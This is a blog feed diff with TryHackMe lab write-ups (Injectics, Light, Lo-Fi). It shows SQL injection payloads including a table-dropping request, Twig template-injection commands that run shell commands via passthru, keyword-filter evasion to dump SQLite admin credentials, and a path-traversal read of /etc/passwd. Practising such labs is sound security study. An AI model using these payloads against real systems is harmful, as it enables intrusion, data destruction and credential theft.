+    <p>It&rsquo;s possible to achieve the same result with a simpler payload: <code>' || 1=1;-- -</code></p>
+</div>
+<h2 id="resetting-users-sqli" >
+  <a href="#resetting-users-sqli">Resetting users: SQLi</a>
+</h2>
+<p>The dashboard provides the ability to edit the leader board. A<code>POST</code> request to <code>/edit_leaderboard.php</code> saves new data. Here I again used sqlmap to find vulnerable fields:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">$</span> sqlmap <span style="color:#89dceb;font-weight:bold">-</span>r edit<span style="color:#89dceb;font-weight:bold">.</span>req <span style="color:#89dceb;font-weight:bold">--</span>level <span style="color:#fab387">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">---</span>
+</span></span><span style="display:flex;"><span>Parameter: gold (POST)
+</span></span><span style="display:flex;"><span>    Type: boolean<span style="color:#89dceb;font-weight:bold">-</span>based blind
+</span></span><span style="display:flex;"><span>    Title: MySQL boolean<span style="color:#89dceb;font-weight:bold">-</span>based blind <span style="color:#89dceb;font-weight:bold">-</span> Parameter replace (MAKE_SET)
+</span></span><span style="display:flex;"><span>    Payload: rank<span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">1</span><span style="color:#89dceb;font-weight:bold">&amp;</span>country<span style="color:#89dceb;font-weight:bold">=&amp;</span>gold<span style="color:#89dceb;font-weight:bold">=</span>MAKE_SET(<span style="color:#fab387">1637</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">1637</span>,<span style="color:#fab387">3031</span>)<span style="color:#89dceb;font-weight:bold">&amp;</span>silver<span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">21</span><span style="color:#89dceb;font-weight:bold">&amp;</span>bronze<span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">12345</span>
+</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">---</span>
+</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">...</span>
+</span></span></code></pre></div><p>I did a lot of poking around trying to exploit it. Breakthrough moment came with a very simple payload <code>42;</code> which updated medals for all countries instead of the selected one.</p>
+<p>So, I was ready to reset users by dropping their table using payload <code>42; drop table users;</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>POST /edit_leaderboard.php HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: MACHINE_IP
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q=0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style="display:flex;"><span>Referer: http://10.10.170.160/edit_leaderboard.php?rank=1&amp;country=USA
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length: 67
+</span></span><span style="display:flex;"><span>Origin: http://MACHINE_IP
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>Cookie: PHPSESSID=4jvgqrd1bqc47rqrv7m47id7q1
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: 1
+</span></span><span style="display:flex;"><span>Priority: u=0, i
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rank=6&amp;country=&amp;gold=0&amp;silver=0&amp;bronze=42; drop table users;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 200 OK
+</span></span><span style="display:flex;"><span>Date: Mon, 10 Feb 2_025 19:45:53 GMT
+</span></span><span style="display:flex;"><span>Server: Apache/2.4.41 (Ubuntu)
+</span></span><span style="display:flex;"><span>Expires: Thu, 19 Nov 1981 08:52:00 GMT
+</span></span><span style="display:flex;"><span>Cache-Control: no-store, no-cache, must-revalidate
+</span></span><span style="display:flex;"><span>Pragma: no-cache
+</span></span><span style="display:flex;"><span>Vary: Accept-Encoding
+</span></span><span style="display:flex;"><span>Content-Length: 127
+</span></span><span style="display:flex;"><span>Keep-Alive: timeout=5, max=100
+</span></span><span style="display:flex;"><span>Connection: Keep-Alive
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset=UTF-8
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Seems like database or some important table is deleted. InjecticsService is running to restore it. Please wait for 1-2 minutes.
+</span></span></code></pre></div><div class="callout note" role="note"aria-label="Note">
+    <p>As you noticed, both attempts at using sqlmap only complicated things. Try simple stupid things first!</p>
+</div>
+<h2 id="getting-the-first-flag" >
+  <a href="#getting-the-first-flag">Getting the first flag</a>
+</h2>
+<p>After the user table was restored, I logged in as an administrator using credentials found in <code>mail.log</code>. Here, in the dashboard, we can see our first flag: <code>THM{REDACTED}</code>.</p>
+<h2 id="reading-hidden-flag-file-rce-via-ssti" >
+  <a href="#reading-hidden-flag-file-rce-via-ssti">Reading hidden flag file: RCE via SSTI</a>
+</h2>
+<p>Next flag should be in the flags directory. If you navigate to <code>/flags</code> while logged in as an administrator, you receive access denied error; thus, we need to find another way to access this directory.</p>
+<p>There is a &ldquo;Profile&rdquo; button which leads to <code>/update_profile.php</code> page with three editable fields: email, first name, last name. Editing first name changes to the dashboard greeting.</p>
+<p>By then, I was pretty confident that we had to find a SSTI vulnerability because (a) it was part of the module (b) it&rsquo;s simple enough to allow RCE. My first payload was <code>{{7*'7'}}</code> to confirm that it was Twig templating engine.</p>
+<p>Exploitation proved difficult for me. While trying <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/PHP/#twig" class="external-link">different payloads</a> I quickly understood that we&rsquo;re in the sandbox. So I tried exploiting <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23614" class="external-link">CVE-2022-23614</a> vulnerability that allows bypassing sandbox mode via <code>sort</code> function. I was on the right track but ended up looking for a hint, because functions <code>exec</code> and <code>system</code> did not work. <a href="https://jaxafed.github.io/posts/tryhackme-injectics/" class="external-link">There I learned</a> about another useful function: <code>passthru</code>.</p>
+<p>First, a payload to list files in the directory <code>flags</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{{[&#39;ls flags&#39;,&#34;&#34;]|sort(&#39;passthru&#39;)|join}}
+</span></span></code></pre></div><p>And finally, to get the flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{{[&#39;cat flags/REDACTED.txt&#39;,&#34;&#34;]|sort(&#39;passthru&#39;)|join}}
+</span></span></code></pre></div><p><figure aria-label="Screenshot of the dashboard with displayed flags">
+  <img
+    alt="Screenshot of the dashboard with displayed flags"
+    title="Screenshot of the dashboard with displayed flags"width="1392"height="261"srcset="/articles/2025/02/13/writeup-tryhackme-injectics/dashboard_hu_92f2fb56b3091dc.webp 1392w, /articles/2025/02/13/writeup-tryhackme-injectics/dashboard_hu_97ff9287aac05a1b.webp 420w, /articles/2025/02/13/writeup-tryhackme-injectics/dashboard_hu_a39ce3069206302e.webp 789w, /articles/2025/02/13/writeup-tryhackme-injectics/dashboard_hu_c69a4d3b4c771267.webp 1019w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/02/13/writeup-tryhackme-injectics/dashboard_hu_f97d734f2533b950.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Writeup: TryHackMe Light</title>
+    <link rel="alternate" href="https://www.aviskase.com/articles/2025/02/05/writeup-tryhackme-light/" hreflang="en"/>
+    <published>2025-02-05T19:03:58Z</published>
+    <updated>2025-02-05T19:03:58Z</updated>
+    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-02-05:/articles/2025/02/05/writeup-tryhackme-light/</id>
+    
+    <summary type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/r/room/lightroom" class="external-link">Light</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: db</li>
+</ul>
+<p>I am working on a database application called Light! Would you like to try it out?  If so, the application is running on port 1337. You can connect to it using <code>nc MACHINE_IP 1337</code>. You can use the username <code>smokey</code> in order to get started.</p>]]></summary>
+    <content type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/r/room/lightroom" class="external-link">Light</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: db</li>
+</ul>
+<p>I am working on a database application called Light! Would you like to try it out?  If so, the application is running on port 1337. You can connect to it using <code>nc MACHINE_IP 1337</code>. You can use the username <code>smokey</code> in order to get started.</p>
+</div>
+<p>Connect to the machine and try invalid and valid usernames:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nc MACHINE_IP <span style="color:#fab387">1337</span>
+</span></span><span style="display:flex;"><span>Welcome to the Light database!
+</span></span><span style="display:flex;"><span>Please enter your username: blah
+</span></span><span style="display:flex;"><span>Username not found.
+</span></span><span style="display:flex;"><span>Please enter your username: smokey
+</span></span><span style="display:flex;"><span>Password: vYQ5ngPpw8AdUmL
+</span></span></code></pre></div><p>Try a quote to check for injection vulnerabilities:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: smokey&#39;
+</span></span><span style="display:flex;"><span>Error: unrecognized token: &#34;&#39;smokey&#39;&#39; LIMIT 30&#34;
+</span></span></code></pre></div><p>Good, we&rsquo;re dealing with the database. Let&rsquo;s break out of the error with a comment:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: smokey&#39;--
+</span></span><span style="display:flex;"><span>For strange reasons I can&#39;t explain, any input containing /*, -- or, %0b is not allowed :)
+</span></span></code></pre></div><p>Ok, no comments. We can do it differently:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: smokey&#39; or &#39;
+</span></span><span style="display:flex;"><span>Password: vYQ5ngPpw8AdUmL
+</span></span></code></pre></div><div class="callout note" role="note"aria-label="Note">
+    <p>After finishing the room I learned that you can do <code>smokey' '</code> to create a <a href="https://www.w3schools.com/sql/sql_alias.asp" class="external-link">SQL alias</a> with the same result.</p>
+</div>
+<p>So, there is some filtering here. And it also checks keywords:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: &#39; UNION 
+</span></span><span style="display:flex;"><span>Ahh there is a word in there I don&#39;t like :(
+</span></span></code></pre></div><p>At this point I guessed that room&rsquo;s name hinted at SQLite database. Using this <a href="https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf" class="external-link">SQLite explotaition paper</a> as a reference, let&rsquo;s enumerate tables and their structures. To escape keyword filtering we can use random letter cases.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: -1&#39; UnioN Select group_concat(tbl_name) FRoM sqlite_master WhEre type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; or &#39;
+</span></span><span style="display:flex;"><span>Password: usertable,admintable
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Please enter your username: -1&#39;  UnIon SeLeCT sql FroM sqlite_master WHerE type!=&#39;meta&#39; AND sql NOT NULL AND name =&#39;usertable&#39; or &#39;
+</span></span><span style="display:flex;"><span>Password: CREATE TABLE usertable (
+</span></span><span style="display:flex;"><span>                   id INTEGER PRIMARY KEY,
+</span></span><span style="display:flex;"><span>                   username TEXT,
+</span></span><span style="display:flex;"><span>                   password INTEGER)
+</span></span><span style="display:flex;"><span>Please enter your username: -1&#39;  UnIon SeLeCT sql FroM sqlite_master WHerE type!=&#39;meta&#39; AND sql NOT NULL AND name =&#39;admintable&#39; or &#39;
+</span></span><span style="display:flex;"><span>Password: CREATE TABLE admintable (
+</span></span><span style="display:flex;"><span>                   id INTEGER PRIMARY KEY,
+</span></span><span style="display:flex;"><span>                   username TEXT,
+</span></span><span style="display:flex;"><span>                   password INTEGER)
+</span></span></code></pre></div><p>We&rsquo;re ready to get flags. First flag: admin username.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: -1&#39;  UnIon SeLeCT group_concat(username) FroM &#39;admintable&#39; WHERE id NOT NULL or &#39; 
+</span></span><span style="display:flex;"><span>Password: REDACTED,flag
+</span></span></code></pre></div><p>Second and third flags: admin passwords and flag value.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username:-1&#39;  UnIon SeLeCT group_concat(password) FroM &#39;admintable&#39; WHERE id NOT NULL or &#39;
+</span></span><span style="display:flex;"><span>Password: REDACTED,REDACTED
+</span></span></code></pre></div><p>Or, to get a full table with all flags at once:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: -1&#39;  UnIon SeLeCT GROUP_CONCAT(username || &#39; &#39; || password, &#39;, &#39;) AS combined FroM &#39;admintable&#39; WHERE id NOT NULL or &#39;
+</span></span><span style="display:flex;"><span>Password: REDACTED REDACTED, flag REDACTED
+</span></span></code></pre></div>]]></content>
+  </entry>
+  <entry>
+    <title>Writeup: TryHackMe Lo-Fi</title>
+    <link rel="alternate" href="https://www.aviskase.com/articles/2025/02/03/writeup-tryhackme-lo-fi/" hreflang="en"/>
+    <published>2025-02-03T17:12:54Z</published>
+    <updated>2025-02-03T17:12:54Z</updated>
+    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-02-03:/articles/2025/02/03/writeup-tryhackme-lo-fi/</id>
+    
+    <summary type="html"><![CDATA[<div class="callout info"><ul>
+<li><a href="https://tryhackme.com/r/room/lofi" class="external-link">Lo-Fi</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: web</li>
+</ul>
+<p>Want to hear some lo-fi beats, to relax or study to? We&rsquo;ve got you covered!
+Check out similar content on TryHackMe:</p>
+<ul>
+<li>LFI Path Traversal</li>
+<li>File Inclusion</li>
+</ul></div>
+<p>Very simple room. Its description mentions <em>local file inclusion</em> vulnerability.</p>
+<p>Open the website at <code>http://MACHINE_IP</code>. There are links to other pages like this: <code>http://MACHINE_IP/?page=relax.php</code></p>]]></summary>
+    <content type="html"><![CDATA[<div class="callout info"><ul>
+<li><a href="https://tryhackme.com/r/room/lofi" class="external-link">Lo-Fi</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: web</li>
+</ul>
+<p>Want to hear some lo-fi beats, to relax or study to? We&rsquo;ve got you covered!
+Check out similar content on TryHackMe:</p>
+<ul>
+<li>LFI Path Traversal</li>
+<li>File Inclusion</li>
+</ul></div>
+<p>Very simple room. Its description mentions <em>local file inclusion</em> vulnerability.</p>
+<p>Open the website at <code>http://MACHINE_IP</code>. There are links to other pages like this: <code>http://MACHINE_IP/?page=relax.php</code></p>
+<p>Attempt to get LFI <code>http://MACHINE_IP/?page=../../../etc/passwd</code> is working.</p>
+<p>Let&rsquo;s try to find a flag. I just stompted up in the directory hierarchy: <code>http://MACHINE_IP/?page=../../../flag.txt</code>. Success: <code>flag{REDACTED}</code>!</p>
+<p>Even though it is a very simple room, I still checked other writeups. And it was a good idea because here you can read about <a href="https://jaxafed.github.io/posts/tryhackme-lo-fi/#extra---rce" class="external-link">how to escalate LFI to RCE</a>.</p>
+]]></content>
+  </entry>
+</feed>
